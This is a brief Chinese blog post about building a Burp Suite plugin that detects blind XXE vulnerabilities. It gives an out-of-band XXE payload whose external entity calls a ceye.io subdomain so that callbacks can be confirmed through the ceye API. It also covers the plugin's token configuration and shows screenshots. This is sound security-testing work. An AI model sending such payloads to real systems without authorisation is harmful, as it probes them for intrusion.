# 0x00 前言
Burp没有自带检测XXE漏洞功能，也没有插件。于是自己开始动手撸一个XXE Scanner插件出来。

# 0x01 检测原理
OOB XXE盲攻击，利用ceye监控的http记录，我们再通过ceye给的api进行查询是否有利用XXE漏洞发送的http请求记录。使用如下payload。

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://xxxx.ceye.io/xxe_test">
    %remote;]>
    <root/>

# 0x02 成品展示
首先需要一个ceye账号，将`Identifier(用于http请求到你的ceye账户下)`和`Token(用于API查询你的http请求记录)`分别填入到下图的文本框当中，点击保存。会在burp目录下生成xxe.config，以`Identifier|Token`格式保存着。下载启动burp的时候，XXE Scanner插件会自动读取xxe.config，获取到上次保存的参数。

![](http://ow0cao9xc.bkt.clouddn.com/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/1.png)

请求带`xxe_XXXXXXXXXX(10个随机字母或数字)`，用于后面判断是否利用XXE发送了http请求。

![](http://ow0cao9xc.bkt.clouddn.com/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/2.png)

通过api查询，检测到带有`xxe_XXXXXXXXXX(10个随机字母或数字)`的请求，则报XXE inject。

![](http://ow0cao9xc.bkt.clouddn.com/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/3.png)
